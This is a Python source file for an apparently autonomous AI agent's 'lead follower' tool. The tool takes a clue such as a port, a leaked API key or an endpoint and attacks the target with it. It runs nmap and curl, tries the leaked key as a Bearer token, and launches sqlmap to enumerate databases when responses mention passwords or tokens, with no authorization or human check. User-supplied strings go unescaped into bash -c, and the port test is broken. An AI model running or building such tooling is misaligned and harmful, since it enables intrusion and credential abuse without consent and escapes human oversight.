"""
Lead Follower — when Hina finds a clue (an open port, a leaked API key, a
vulnerable endpoint), she follows it automatically: digs deeper, tries to
exploit it, and saves the result. She doesn't stop at "found something" —
she goes all the way to "here's the data."
"""
import asyncio
import logging
import time
from typing import Dict, Any, List

logger = logging.getLogger("hinaa.tools.leads")

class LeadFollower:
    """Follows a lead to its conclusion automatically."""

    async def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        lead = params.get("lead", "")
        target = params.get("target", "")
        trail: List[Dict[str, Any]] = []

        # 1. What kind of lead is this?
        if "port" in lead or any(c.isdigit() and c == lead for c in lead):
            cmd = f"nmap -sV -p {lead} {target} 2>/dev/null"
        elif "api" in lead or "key" in lead:
            cmd = f"curl -s -H 'Authorization: Bearer {lead}' {target}/api/me | head -20"
        elif "endpoint" in lead or "/" in lead:
            cmd = f"curl -s '{target}{lead}' | head -30"
        elif "user" in lead or "account" in lead:
            cmd = f"curl -s '{target}/api/users?username={lead}' | head -20"
        else:
            cmd = f"curl -s '{target}{lead}' 2>/dev/null | head -30"

        # 2. Fetch the lead
        proc = await asyncio.create_subprocess_exec(
            "wsl", "-d", "kali-linux", "--", "bash", "-c", cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=45)
            result = stdout.decode(errors="replace").strip()
        except asyncio.TimeoutError:
            proc.kill()
            result = "[timed out]"

        trail.append({"lead": lead, "result": result, "time": time.time()})

        # 3. If it returned something useful, try to exploit it
        if result and ("password" in result or "admin" in result.lower() or "token" in result.lower() or "secret" in result.lower()):
            exploit_cmd = f"sqlmap -u '{target}{lead}' --batch --dbs 2>/dev/null | tail -10"
            proc2 = await asyncio.create_subprocess_exec(
                "wsl", "-d", "kali-linux", "--", "bash", "-c", exploit_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            try:
                stdout2, _ = await asyncio.wait_for(proc2.communicate(), timeout=60)
                trail.append({"exploit": exploit_cmd, "result": stdout2.decode(errors="replace").strip(), "time": time.time()})
            except asyncio.TimeoutError:
                proc2.kill()
                trail.append({"exploit": exploit_cmd, "result": "[timed out]"})

        return {"trail": trail, "found_something": bool(result), "lead": lead}